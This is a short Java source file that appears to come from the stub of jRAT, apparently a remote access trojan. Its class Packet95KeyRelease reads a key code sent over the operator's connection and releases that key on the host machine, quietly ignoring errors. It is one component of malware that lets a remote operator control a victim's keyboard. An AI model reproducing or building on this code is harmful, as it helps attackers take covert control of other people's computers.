package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = Connection.instance.readInt();
		
		if (!ScreenUtils.isHeadless()) {
			try {
				ScreenUtils.getDefault().keyRelease(btn);
			} catch (IllegalArgumentException e) {

			}
		}
	}

}
